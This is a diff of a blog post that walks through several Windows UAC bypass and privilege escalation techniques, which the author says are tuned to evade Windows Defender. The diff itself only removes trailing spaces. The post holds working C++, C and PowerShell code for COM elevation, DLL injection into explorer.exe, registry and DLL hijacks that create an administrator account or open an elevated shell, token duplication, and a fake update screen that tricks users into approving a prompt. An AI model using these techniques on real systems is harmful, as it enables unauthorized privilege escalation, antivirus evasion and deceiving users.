@@ -15,9 +15,9 @@ tags:
 ---
 
 It's been almost a year since my last post, and during that time I have acquired a strong interest in revisiting privilege escalation techniques for the modern era 😸
-My goal is always to find code that executes across all Windows versions **AND** bypasses at least Windows Defender. In fact, when I write these blog posts, I test all the code against Windows Defender by default to ensure everything is fully tested and can at least bypass defender before I share my findings.  
+My goal is always to find code that executes across all Windows versions **AND** bypasses at least Windows Defender. In fact, when I write these blog posts, I test all the code against Windows Defender by default to ensure everything is fully tested and can at least bypass defender before I share my findings.
 
-Unrelated, but I also added an updated [Discord](https://discord.gg/bqDkEdDrQQ) link on the left panel of my site, in case anyone wants to hop in and say hi.  I've met quite a few of you on Twitter over the years and I've thoroughly enjoyed the conversations that have unfolded since I first joined twitter not that long ago.  Okay, let's dive in to the first UAC bypass method.  
+Unrelated, but I also added an updated [Discord](https://discord.gg/bqDkEdDrQQ) link on the left panel of my site, in case anyone wants to hop in and say hi.  I've met quite a few of you on Twitter over the years and I've thoroughly enjoyed the conversations that have unfolded since I first joined twitter not that long ago.  Okay, let's dive in to the first UAC bypass method.
 
 > Update: 3/20/2025: I think someone at Microsoft secretly reads this blog... 😆 I say that because all the methods I posted in fall of last year are now deprecated.  The irony is that I was able to resurrect an old UAC Bypass method that still works if you tweak it a bit!  See below for more info:
 
@@ -56,22 +56,22 @@ Let's bring it all together.  We will be doing the following:
 
 - Call ICMLuaUtil::ShellExec(...) → results in an elevated process of our choosing
 
-Now time for some code!  We will be using Visual Studio per the usual routine.  We will define our CLASS object CLSID and Interface CLSID as can be seen below.  
+Now time for some code!  We will be using Visual Studio per the usual routine.  We will define our CLASS object CLSID and Interface CLSID as can be seen below.
 
 ```cpp
 
 #include "pch.h"
 #include <shlobj.h>
 #include <atlbase.h>
-#include <shellapi.h> 
+#include <shellapi.h>
 
-#pragma comment(lib, "shell32.lib") 
+#pragma comment(lib, "shell32.lib")
 
 const wchar_t* CLSID_CMSTPLUA = L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
 const wchar_t* IID_ICMLuaUtil = L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}";
 ```
 
- Next, we need to define the vftable (virtual function table), which is a hidden structure created by the compiler that holds pointers to the virtual functions of a class.  In our case, we are interested in the 7th Function/Method in the list, `ShellExec`.  AddRef() and Release() are considered inherited so we don't have to include them.  So technically we're setting up function/method stubs for SetRasCredentials to ShellExec.  It has to be in order by the way, so you can't just exclude the other methods and just point to ShellExec. 
+ Next, we need to define the vftable (virtual function table), which is a hidden structure created by the compiler that holds pointers to the virtual functions of a class.  In our case, we are interested in the 7th Function/Method in the list, `ShellExec`.  AddRef() and Release() are considered inherited so we don't have to include them.  So technically we're setting up function/method stubs for SetRasCredentials to ShellExec.  It has to be in order by the way, so you can't just exclude the other methods and just point to ShellExec.
 
 ![image](https://github.com/user-attachments/assets/0aa3b9fe-c6ab-46ba-b367-d2684daf17a2)
 
@@ -107,7 +107,7 @@ int injector() {
     CLSID clsid;
     IID iid;
 
-    coi=CoInitialize(NULL);  
+    coi=CoInitialize(NULL);
 
     if (FAILED(CLSIDFromString(CLSID_CMSTPLUA, &clsid)) ||
         FAILED(IIDFromString(IID_ICMLuaUtil, &iid))) {
@@ -197,7 +197,7 @@ DWORD GetExplorerPID() {
 }
 
 int main() {
-   
+
     DWORD pid = GetExplorerPID();
     if (!pid) {
         std::wcerr << L"explorer.exe not found!\n";
@@ -207,7 +207,7 @@ int main() {
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
     if (!hKernel32) return 1;
 
-    
+
     auto pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
     if (!pLoadLibraryW) return 1;
 
@@ -277,7 +277,7 @@ Start-Process "C:\Windows\System32\ComputerDefaults.exe"
 
 This parameter is what Windows Defender scrutinizes the most: `-Value "[yourexecutable or command]"`
 
-If you do: `-Value "notepad"`, Defender is super chill and loves you.  
+If you do: `-Value "notepad"`, Defender is super chill and loves you.
 
 If you do: `-Value "cmd"`...
 
@@ -297,7 +297,7 @@ It's as simple as that my friends.  Don't include Drive letters, Don't include p
 
 Also I should mention, the ../../ goes from c:\windows\system32 -> c:\ root directory.  Just create a folder of your choosing and place your .exe in it.
 
-All that's left now is to issue the final statement: 
+All that's left now is to issue the final statement:
 
 `Start-Process "C:\Windows\System32\ComputerDefaults.exe"` and we're off to the races!  Your .exe file you placed in the `Value` parameter will be executed without Defender yelling at you.
 
@@ -361,7 +361,7 @@ Credit first and foremost goes to Emeric Nasi, who discovered this quite some ti
 
 The affected executable is `c:\windows\syswow64\msdt.exe` and we will be seizing the opportunity to exploit a DLL that is vulnerable to DLL hijacking. The reason for the `syswow64` directory is because the vulnerable DLL is the x86/32 bit version, and it will ultimately be loaded by `C:\WINDOWS\SysWOW64\sdiagnhost.exe` which follows the initial loading of `msdt.exe`.  The DLL in question is: `BluetoothDiagnosticUtil.dll`
 
-In order to pull this off, all we need to do is run the following command: 
+In order to pull this off, all we need to do is run the following command:
 
 `c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes`
 
@@ -527,7 +527,7 @@ Now, let's fire up that scheduled task again and see what happens shall we?! �
 
 ![image](https://github.com/user-attachments/assets/f5fba616-3ed2-4228-aa2a-afa5cdefef5f)
 
-It's loaded!  That's no guarantee it worked though...let's check to make sure our new user was created, as well as our text file.  
+It's loaded!  That's no guarantee it worked though...let's check to make sure our new user was created, as well as our text file.
 Sure enough, there's the newly created administrator 😸
 
 ![image](https://github.com/user-attachments/assets/6857aef0-68ac-41be-abfd-96952c9ba9ba)
@@ -540,7 +540,7 @@ OKAY!  we're in business.  **HOWEVER**, there is a caveat to this bypass and the
 
 [https://blogs.windows.com/windows-insider/2024/10/02/announcing-windows-11-insider-preview-build-27718-canary-channel/](https://blogs.windows.com/windows-insider/2024/10/02/announcing-windows-11-insider-preview-build-27718-canary-channel/)
 
-Trust me, I tried... 😿  But until then, this particular bypass works even with UAC set to ALWAYS ON.  
+Trust me, I tried... 😿  But until then, this particular bypass works even with UAC set to ALWAYS ON.
 
 ***UAC Bypass Technique #4 - Mock Trusted Folders<br>(UAC setting - Don't notify me when I make changes to Windows settings)***
 -
@@ -576,7 +576,7 @@ Next, I need to understand how that API is laid out.  I'll check it out on Micro
 
 ![image](https://github.com/user-attachments/assets/2ee4eb1b-fa93-481e-be39-653c7dba4625)
 
-cool, let's put it all together: 
+cool, let's put it all together:
 
 ```c
 //x86_64-w64-mingw32-gcc netutils.c -shared -o netutils.dll
@@ -587,7 +587,7 @@ cool, let's put it all together:
 BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){
     switch(dwReason){
         case DLL_PROCESS_ATTACH:
-            WinExec("cmd.exe", 1); 
+            WinExec("cmd.exe", 1);
             break;
         case DLL_PROCESS_DETACH:
             break;
@@ -630,7 +630,7 @@ and be greeted with a beautiful administrator command prompt 😼
 
 ![image](https://github.com/user-attachments/assets/bcf9dd38-c8a3-4e5d-b53c-9c5c55a36920)
 
-and that's it!  
+and that's it!
 
 Now, time for the grand finale 🙂  I had the most fun with this one, as it's the most creative and consequently the most difficult to learn and pull off...at least for me personally.  But that's what made it all the more enjoyable to research!  I give you...
 
@@ -759,7 +759,7 @@ int main(int argc, char* argv[]) {
         nullptr,
         nullptr,
         &si,
-        &pi)) 
+        &pi))
     {
         std::cerr << "Failed to create process: " << GetLastError() << std::endl;
         CloseHandle(hNewToken);
@@ -825,19 +825,19 @@ $form.KeyPreview = $true
 
 $form.Add_KeyDown({
     param($sender, $eventArgs)
-    
+
     if ($eventArgs.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
-        $sender.Close()  
+        $sender.Close()
     }
 })
 
 $form.Add_Paint({
     param($sender, $event)
-    
+
     $graphics = $event.Graphics
-    
+
     $text = "[ Please hit (Enter) then select (YES) if prompted to continue the update ]"
-    
+
     $font = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
     $brush = [System.Drawing.Brushes]::White
 
@@ -870,11 +870,11 @@ Start-Sleep -Seconds 5
 $taskschd = Get-Process -Name "mmc" -ErrorAction SilentlyContinue
 
 if ($taskschd) {
-    
+
     $hwnd = $taskschd.MainWindowHandle
-	
+
     [User32]::SetForegroundWindow($hwnd)
-    
+
     # Wait a moment for the window to come to the front
     Start-Sleep -Seconds 2
 
